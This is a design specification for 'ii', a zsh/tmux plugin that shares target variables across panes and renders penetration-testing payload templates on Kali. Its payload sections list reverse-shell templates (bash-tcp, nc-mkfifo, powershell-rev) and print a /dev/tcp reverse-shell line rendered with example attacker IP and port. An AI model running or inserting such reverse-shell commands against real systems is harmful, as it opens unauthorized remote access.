---
tags:
aliases:
document_type: spec
field:
description: ii zsh plugin specification
---

# ii Spec

`ii` is a zsh plugin for tmux-scoped workflow variables and payload rendering.

The plugin is designed for tmux-heavy terminal workflows where multiple panes
need to share target values, render payload templates, and copy the rendered
payload without stale shell state.

## Product Goals

`ii` manages five concerns:

```text
1. tmux session-scoped variables
2. current pane variable loading
3. payload template selection
4. payload rendering
5. clipboard or tmux-buffer copy
```

The primary constraints:

```text
- Values must be shared across panes in the same tmux session.
- Payload rendering must read fresh tmux session values every time.
- The current shell should only receive variables when explicitly loaded.
- Copy behavior must not break inside tmux or on payloads with special chars.
- The codebase should be plugin-first and split by responsibility layers.
- Kali deployment should work by installing the generated `export/ii` directory.
- Bundled payloads should work without requiring users to export II_PAYLOAD_DIR.
```

## State Model

There are two separate variable states:

```text
tmux session environment = source of truth shared by all panes, internally ii_ prefixed
current shell environment = local state for the current pane, without ii_ prefix
```

Command behavior follows this model:

```text
ii s   writes internal ii_ names to tmux and unprefixed names to current shell
ii g   reads one internal ii_ value from tmux, copies it, and prints it
ii l   loads tmux session values into current shell once without ii_ prefix
ii sync optionally keeps current shell values refreshed from tmux before prompts
ii ls  reads non-empty tmux session values and displays them without ii_ prefix
ii i   reads tmux session values, then copies selected variable values
ii p   reads tmux session values directly while rendering
```

`ii s` and `ii l` export lowercase shell names by default. `II_EXPORT_CASE`
can be set to `lower`, `upper`, or `both`. `ii l` is a one-time load. A pane
only keeps a prompt-time sync hook enabled after `ii sync on`.

This distinction is required:

```text
echo $LHOST          needs ii l first in that pane
ii p render payload   does not need ii l; it reads tmux directly
```

## Public Interface

### Dispatcher

```text
ii COMMAND [ARGS]
```

Dispatches to command implementations:

```text
ii set
ii get
ii load
ii sync
ii clip
ii interactive
ii ls
ii payload
ii unset
ii version
ii help
```

### Short Subcommands

```text
ii s
ii sr
ii g
ii l
ii i
ii ls
ii vo
ii p
ii pc
ii pe
ii pce
ii pic
ii pice
ii u
ii h
```

Final naming decision:

```text
ii s = ii set
ii sr VALUE = ii set rhost=VALUE
ii g = ii get
ii l = ii load
ii i = ii interactive
ii ls = variable list
ii vo [PATH] = ii v --out [PATH] (`ii voc` remains compatible)
ii p = ii payload
ii pc KEYWORD [...] = ii payload --copy KEYWORD [...]
ii pe [KEYWORD ...] = ii payload --execute [KEYWORD ...]
ii pce [KEYWORD ...] = ii payload --copy --execute [KEYWORD ...]
ii pic = ii payload --input --copy
ii pice = ii payload --input --copy --execute
ii u = ii unset
ii h = ii help
```

`ii p` is payload-only. Variable listing belongs to `ii ls`.

## Command Specs

### `ii set NAME VALUE`

Short form:

```text
ii s NAME=VALUE
ii s:NAME=VALUE[,NAME=VALUE...]
ii s:NAME[,NAME...] --from-shell
ii s --from-shell -a
ii sha
ii s --from-file [PATH]
ii sf [PATH]
```

`ii set` is CLI-only. With no arguments or with a name but no value, it prints
usage and returns status 2. Interactive variable management belongs to `ii i`.

One variable can use `NAME VALUE` or `NAME=VALUE`. Multiple assignments use
separate `NAME=VALUE` arguments or comma-separated shortcut entries:

```zsh
ii s usert=alice
ii set usert=alice passt='S3cret!'
ii s:usert=alice,passt='S3cret!'
```

`--from-shell` saves current shell variables back into tmux. It checks lowercase
shell names first, then uppercase names, and prints a red warning for missing
variables:

```zsh
ii s:usert,passt --from-shell
```

`ii s --from-shell -a` checks only the default variable names, prefers a
non-empty lowercase shell value over uppercase, saves and prints every match,
and silently skips unset or empty defaults. The default list is:

```text
domain lhost rhost lport rport user1 pass1 user2 pass2 user3 pass3 user4 pass4
user5 pass5 cuser cpass tuser tpass directs
```

`ii s --from-file [PATH]` safely parses dotenv `NAME=VALUE` entries without
sourcing or evaluating the file. PATH defaults to `.env` in the current
directory. Blank lines, comments, an optional `export ` prefix, and quoted
values are supported. Valid values are stored in tmux, exported into the
current shell, and printed like `--from-shell`; missing files and malformed
entries are reported on stdout.

`-d` means detect. It is only supported for `LHOST` and detects the IPv4 address
from an interface. The default interface is `tun0`.

```zsh
ii s:lhost -d
ii s:lhost -d eth0
ii s:l -d
ii s -d
```

When `II_AUTO_DETECT_LHOST` is enabled, setting `rhost` or `rhosts` also detects
`lhost` from `II_AUTO_DETECT_LHOST_INTERFACE`, defaulting to `tun0`, and prints
`lhost has automatically sets as VALUE`. If the same assignment batch explicitly
sets `lhost`, the automatic update is skipped.

Behavior:

```text
1. Normalize NAME into ii_name.
   Names are canonicalized to lowercase, so user2 and USER2 both become ii_user2.
2. Validate the normalized variable name.
3. Store ii_name=VALUE in the current tmux session environment.
4. Export shell variables into the current shell according to II_EXPORT_CASE.
5. When enabled and rhost/rhosts was set, detect and store lhost.
6. Print name=VALUE without the internal ii_ prefix.
```

Example:

```zsh
ii s LHOST 192.168.45.192
ii s LPORT 443
ii s RHOST 192.168.201.175
ii s RPORT 80
```

Stored values:

```text
ii_lhost=192.168.45.192
ii_lport=443
ii_rhost=192.168.201.175
ii_rport=80
```

User-facing shell values:

```text
lhost=192.168.45.192
lport=443
rhost=192.168.201.175
rport=80
```

### `ii load`

Short form:

```text
ii l
```

Behavior:

```text
1. Read all ii_ variables from the current tmux session.
2. Validate each variable name before export.
3. Export each variable into the current shell without the ii_ prefix.
   II_EXPORT_CASE controls whether lower, upper, or both names are exported.
4. Do not export default variable names that have not been assigned values.
5. Print the number of loaded variables.
```

Purpose:

```text
Synchronize an existing pane after another pane has changed tmux session values.
```

Example:

```zsh
ii l
echo $LHOST
```

### `ii interactive`

Short form:

```text
ii i
```

Behavior:

```text
1. Read configured ii_ variables from tmux.
2. Merge them with the default names domain, lhost, rhost, lport, rport,
   user1 through user5, pass1 through pass5, cuser, cpass, tuser, tpass, and
   directs.
3. Present names in fzf with populated variables before empty default names.
4. Show each name with a single-line value preview.
5. Show the selected variable value in a compact bottom preview pane.
6. Support case-insensitive fuzzy search.
7. j/k moves selection.
8. i/l edits the selected variable value.
9. Enter copies the selected variable value and closes.
10. y copies the selected existing variable value without closing.
11. Show `add new variable` as the final option.
12. If `add new variable` is selected, prompt for a variable name and value.
   A name without a value stores an empty value.
13. Copy selected existing variable values through the configured copy layer.
14. Do not export values into the current shell unless prompt auto-sync was
    explicitly enabled by `ii sync on` in that shell.
15. h/q aborts the selector.
16. Display a nano-style keys and status block at the bottom of the preview
    pane, while keeping vim-style movement keys.
```

This command is a variable copy/add layer, not a shell loading layer. Use
`ii l` to load non-empty tmux variables into the current shell.

### `ii ls [PATTERN]`

Behavior:

```text
1. Read all ii_ variables from tmux.
2. Skip empty values.
3. If PATTERN is omitted, print every non-empty variable.
4. If PATTERN is present, filter by key name only, case-insensitively.
5. Print each match as a lowercase key line followed by its value, without blank
   separator lines.
6. Do not open fzf.
7. Do not filter values.
```

Examples:

```zsh
ii ls
ii ls host
ii ls usert
ii ls port
ii ls d
```

Expected output:

```text
lhost
192.168.45.192
rhost
192.168.201.175
lport
443
rport
80
```

Expected fallback filtering:

```text
ii ls port   matches LPORT and RPORT
ii ls 443    does not match lport=443 unless the variable name contains 443
```

### `ii v --out [PATH]`

Alias:

```text
ii vo [PATH]
```

Behavior:

```text
1. Read all ii_ variables from the current tmux session.
2. Skip empty values.
3. Remove the internal ii_ prefix and write lowercase shell names.
4. Quote every value with shell-safe single-quote escaping.
5. Write to PATH, defaulting to .env in the current directory.
6. Atomically replace an existing output file.
7. Print the number of written variables and the absolute output path.
```

The generated file can be loaded with `source ./.env`. `ii v` without `--out`
retains its existing alias behavior for `ii ls`.

### `ii payload [CATEGORY]`

Short form:

```text
ii p [CATEGORY]
```

Behavior:

```text
1. Resolve the payload library directory.
2. Scan payload files and display path-style entries.
3. Apply optional category filtering.
4. Let fzf handle fuzzy search and selection with the selected template payload
   preview shown in the bottom preview pane. The selector list shows payload
   paths only. Preview renderable tokens with values in green and missing
   renderable tokens in red without changing render output.
5. Resolve the selected entry to a payload file.
6. Render with a non-empty lowercase shell value first, then a fresh matching
   tmux `ii_` value, preserving missing tokens.
7. Print the rendered payload.
8. Print variables used by the selected payload.
9. Display description as an independent preview block and controls/status at
    the bottom of the preview. Reserve the description block when space allows,
    but preserve controls/status first.
10. Let l unfold the selected script into a full preview. In unfolded mode,
    hide and disable filtering while preserving j/k selection movement, y
    copy-and-quit, Enter render/output, and q abort. Let h return to the
    searchable selector. In compact normal mode, e executes the selected
    rendered payload in the current shell.
11. `ii p --www --file PATH` reads PATH, renders it with the payload renderer,
    prints the render report and rendered output, and symlinks PATH under
    /www/p without overwriting existing targets.
12. Multiple positional arguments are joined with spaces and passed to fzf as
    the initial query. A single established category retains category filtering.
13. `--execute` makes Enter confirm and execute in the current shell; `pe` is
    the fixed alias. Adding `--copy`, or using `pce`, copies after confirmation
    and before execution. Execution is not isolated, so shell side effects
    persist.
14. `--copy` and `pc` open the normal selector with all keywords joined as the
    initial query. The operator reviews the selected payload and presses `y`
    before copying.
```

Categories:

```text
all      all payloads
shell    shell/*
script   script/*
linux    */linux/*
windows  */windows/*
sqli     sqli/*
xss      xss/*
```

`script/*` is for custom script snippets. New files use lowercase placeholders
such as `%rhost%`, `$rhost`, `${lhost}`, and `${file:t}`. Uppercase and legacy
`II_NAME` forms remain literal. If no
renderable placeholder is present, the selected script text is copied literally.

Payload files may start with a metadata line:

```text
# description: short operator-facing description
```

The description is shown in a reserved description block above the preview body,
but is omitted from copied and printed payload output. Payloads without a
description still reserve the same block with an empty content line.

Combo payloads under `script/combo/` may use `# stage:` metadata for multi-stage
command groups; stage formatting is a presentation layer over normal payload
rendering.

First implementation supports argument-based category filtering:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p sqli
ii p xss
```

### `ii unset NAME [...]`

Behavior:

```text
1. Normalize each NAME into ii_name.
2. Remove the variable from the current tmux session.
3. Unset the variable in the current shell.
4. Print each unset variable.
```

### `ii unset -a`

Behavior:

```text
1. Prompt before deleting all ii_ variables in the current tmux session.
2. Continue only when the answer is exactly y.
3. Remove every ii_ variable from the current tmux session.
4. Unset matching lowercase and uppercase shell variables.
5. Print the number of removed variables.
```

### `ii help [COMMAND]`

Behavior:

```text
1. Without COMMAND, print the top-level command summary.
2. With COMMAND, route to that command's own --help implementation.
```

Each command owns its help text so new behavior is documented near the command.

## Payload Library

Default path:

```text
${II_PLUGIN_DIR}/payloads/
```

Set `II_PAYLOAD_DIR` only to use an external payload library.

Recommended layout:

```text
payloads/
  shell/
    linux/
      bash-tcp
      sh-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    config/
      hosts
    tool/
      ii/
        detect-lhost
      nmap/
        nmap
  xss/
    basic-alert
```

Selector display format:

```text
shell/linux/bash-tcp
shell/linux/sh-tcp
shell/linux/nc-mkfifo
shell/windows/powershell-rev
script/config/add-hosts
script/tool/ii/detect-lhost
script/tool/nmap/nmap
xss/basic-alert
```

Payload templates are plain text files.

Preferred placeholder form:

```text
$lhost
${lport}
${domain}
```

Example:

```text
/bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
```

## Payload Render Layer

Payload rendering reads current command shell overrides without requiring the
pane to run `ii l`, then falls back to fresh tmux session state.

Input:

```text
selected payload file or pasted input text
current lowercase shell variables
current tmux session ii_ variables
```

Output:

```text
rendered payload string
used variable report
```

Required behavior:

```text
1. Read the selected payload file or pasted input as plain text.
   A first-line `# description:` metadata line is not part of the render body.
2. Recognize lowercase `%name%`, `$name`, `${name}`, and `${name:t}`
   placeholders. Leave uppercase and legacy `II_NAME` forms unchanged.
3. Use a non-empty lowercase shell variable from the current command first.
4. Otherwise read the matching tmux `ii_name` value at render time.
5. Preserve the original token when both sources are missing or empty.
6. Leave uppercase shell variables and PowerShell scope variables unchanged.
7. Report shell, tmux, and missing render sources without changing rendered
   output.
```

Important test case:

```text
pane1: ii s LHOST 10.10.10.10
pane1: ii s LPORT 9001
pane2: echo $LHOST
pane2: ii p linux
```

Expected:

```text
echo $LHOST prints empty output in pane2
ii p renders /bin/sh -i >/dev/tcp/10.10.10.10/9001 ...
```

## Fuzzy Search Layer

`fzf` is the selection UI for:

```text
ii i = variable selection
ii p = payload selection
```

Responsibilities:

```text
ii i:
  - Input: default variable names plus II_ variable lines from tmux.
  - UI: fzf with vim-style movement and single-value actions.
  - Display: variable name, single-line value preview, and red "more" marker
    when the full value is longer than the displayed preview.
  - Preview: full selected value with a bottom keys block.
  - Output: selected display lines mapped back to names and values.
  - Next layer: edit, add, or copy behavior.

ii p:
  - Input: path-style payload entries.
  - UI: fzf selector with path-only entries, independent description preview
    block, green/red selected template preview token status, and bottom-pinned
    preview controls/status.
  - Output: one selected payload path.
  - Next layer: payload render.
```

Non-interactive fzf testing uses:

```zsh
FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux
```

When `fzf --filter` returns multiple matches, `ii p` should use the first
non-empty selected line. This keeps test mode deterministic and prevents
multi-line strings from being interpreted as one path.

## Variable Loading Layer

Variable loading must be separate from payload rendering.

Responsibilities:

```text
ii_var_normalize_name:
  - Strip leading "export ".
  - Strip anything after "=".
  - Lowercase the name.
  - Add ii_ prefix when missing.
  - Validate against ii_[a-z_][a-z0-9_]*.

ii_var_lines_from_tmux:
  - Read tmux show-environment.
  - Return only ii_ assignments.

ii_export_var_line:
  - Validate NAME before export.
  - Export lowercase, uppercase, or both names according to II_EXPORT_CASE.
  - Use global exported assignment so existing shell variables are overwritten.

ii_enable_auto_sync:
  - Enable prompt-time sync after `ii sync on`.
  - Keep the sync hook last in `precmd_functions` so prompt integrations that
    rewrite lowercase names are corrected before the next command.

ii_disable_auto_sync:
  - Disable prompt-time sync for the current shell.

ii_auto_sync_status:
  - Print `II_SYNC_LOADED_VARS` and whether the precmd hook is installed.

ii_var_display_lines_for_fzf:
  - Convert ii_lhost=... to lhost=... for TUI display.
  - Do not change tmux storage format.

ii_var_line_from_display:
  - Convert selected lhost=... back to ii_lhost=... before export.
```

Do not export arbitrary tmux environment lines.

## Copy Layer

Copy behavior is intentionally separated because payloads may contain spaces,
quotes, shell metacharacters, newlines, and other special characters.

Current strategy:

```text
1. If II_CLIP_BACKEND is set, use that named backend.
2. If II_CLIP_CMD is set, pipe rendered payload to that command.
3. Otherwise prefer OSC52 in active SSH sessions when base64 is available.
4. Otherwise prefer xclip-both in local tmux sessions with DISPLAY and xclip,
   even when tmux still has stale SSH environment variables.
5. Otherwise prefer OSC52 inside tmux when base64 is available.
6. Otherwise auto-detect clip.exe, wl-copy, xclip, xsel, pbcopy.
7. If no clipboard tool is found inside tmux, pipe to tmux load-buffer -.
```

Supported named backend:

```text
osc52
xclip-both
```

OSC52 is intended for tmux or SSH sessions where the remote Kali shell should
copy text to the local terminal clipboard. Inside tmux, the OSC52 backend first
tries `tmux load-buffer -w -` so tmux handles clipboard integration. If that
fails, the payload is base64 encoded and wrapped in OSC52; inside tmux, that
sequence is wrapped in tmux passthrough escape framing.

Kali over SSH or tmux deployment uses OSC52 by default when possible. To force
OSC52 explicitly, set:

```zsh
export II_CLIP_BACKEND=osc52
```

Do not require X server or Wayland clipboard packages for this workflow.

Preferred tmux behavior:

```text
print -rn -- "$rendered" | tmux load-buffer -
```

Reason:

```text
stdin-based copy avoids passing payload content as a tmux command argument.
This is safer for special characters and less likely to break inside tmux.
```

If OSC52 is unsupported by the terminal, users can override the backend with
`II_CLIP_CMD` or `II_CLIP_BACKEND`.

For VMware/Kali console sessions where tmux copy-mode reaches the host
clipboard through X selections, users can mirror that path with:

```zsh
export II_CLIP_BACKEND=xclip-both
```

This pipes text through:

```zsh
xclip -i -f -selection primary | xclip -i -selection clipboard
```

## Plugin Architecture

`ii` is plugin-first.

Public entrypoint:

```text
ii.plugin.zsh
```

Plugin-level settings:

```text
II_PLUGIN_DIR   defaults to the plugin root directory
II_PAYLOAD_DIR  defaults to ${II_PLUGIN_DIR}/payloads unless already set
II_WWW_ROOT     defaults to /www unless already set
```

Users only need to set `II_PAYLOAD_DIR` when they want an external payload
library, or `II_WWW_ROOT` when their web root is not `/www`.

Layer files:

```text
lib/tmux.zsh        tmux and external command checks
lib/help_registry.zsh shared help topic registration and longest-path routing
lib/color.zsh       shared ANSI policy, TTY detection, and named color helpers
lib/clipboard.zsh   copy backend detection and copy
lib/fzf.zsh         shared fzf input and preview helpers
lib/var_helpers.zsh variable helpers and candidate generation
lib/var_interactive.zsh interactive variable selection, add, and edit flows
lib/vars.zsh        variable command entrypoints
lib/var_output.zsh  v routing and shell-sourceable variable file output
lib/www.zsh         /www tree, search, and symlink helpers
lib/payloads.zsh    payload list, fuzzy selection, render, reports
lib/payload_input.zsh pasted input command, stream protocol, and ZLE editor
lib/payload_command.zsh public payload routing facade and aggregate help
lib/help.zsh        top-level help summary and help-topic registration
lib/version.zsh     version command
lib/core.zsh        dispatcher and command functions
```

Load order:

```text
1. tmux.zsh
2. help_registry.zsh
3. color.zsh
4. tmux_integration.zsh
5. clipboard.zsh
6. fzf.zsh
7. interact.zsh
8. var_helpers.zsh
9. var_interactive.zsh
10. vars.zsh
11. var_output.zsh
12. workflow.zsh
13. workflow_tmux.zsh
14. payloads.zsh
15. payload_input.zsh
16. www.zsh
17. payload_command.zsh
18. help.zsh
19. version.zsh
20. core.zsh
```

## Deployment Package

`script/make` builds the deployable plugin directory:

```text
export/ii/
  ii.plugin.zsh
  lib/
  payloads/
  script/ii-tmux-pice
  README.md
```

`export/` is generated output and should not be edited by hand. Deployment
should copy `export/ii` as one unit.

## Help Audit Script

`script/help` is a development helper for comparing registered command help
against this spec. Each command layer registers its canonical topic and handler
beside the implementation. The script sources `ii.plugin.zsh` and prints all
canonical topics below; topic order follows feature-layer load order:

Live help uses three separate sections: executable forms belong in `usage`, true
alternative names belong in `Aliases`, and representative lookup routes belong
in `Help`. Full conventions and maintainer workflow are defined in
`doc/help.md`.

```text
ii help
ii help set
ii help get
ii help clip
ii help load
ii help sync
ii help interactive
ii help ls
ii help payload
ii help payload-input
ii help payload-www
ii help payload-www-file
ii help payload-www-ln
ii help payload-www-ls
ii help payload-www-search
ii help unset
ii help version
```

The script must call the listed help implementations instead of duplicating
help text. It is not part of the deployable `export/ii` package.

## Implementation Status

Implemented:

```text
- plugin entrypoint: ii.plugin.zsh
- plugin-provided default II_PLUGIN_DIR, II_PAYLOAD_DIR, and II_WWW_ROOT
- layered lib/ structure
- ii dispatcher with short subcommands: s, sr, sf, sha, g, gr, gl, l, la, i, v,
  vo, voc, p, pc, pe, pce, pic, pie, pice, tmux, u, h
- tmux session variable source of truth
- argument-based payload filtering
- fzf payload and variable selection
- nano-style bottom preview keys and copy status
- compact borderless selector footers with complete-unit wrapping
- payload multi-keyword initial queries and current-shell execution through e,
  --execute, pe, and copy-before-execute pce
- interactive variable edit, add, and copy flows
- interactive payload input with Enter submit, Alt+Enter newline, and a persistent
  bottom key hint
- input execute through `ii pie` and input-copy-execute through `ii pice`, plus
  the native tmux `:ii` command alias for opening a non-copying popup that sends
  confirmed input to the originating pane
- fresh tmux-based payload rendering
- payload description metadata
- deterministic non-interactive fzf filter behavior
- stdin-based tmux buffer fallback for copy
- default OSC52 backend for tmux/SSH clipboard copy
- `ii s:lhost -d [INTERFACE]` interface IPv4 detection
- generated `export/ii` deployment package through `script/make`
- thin per-feature help registry and `script/help` audit script
```

Not implemented yet:

```text
- fzf keybinds for in-TUI category switching
- formal automated test script
- strict warning for missing variables in payload templates
```
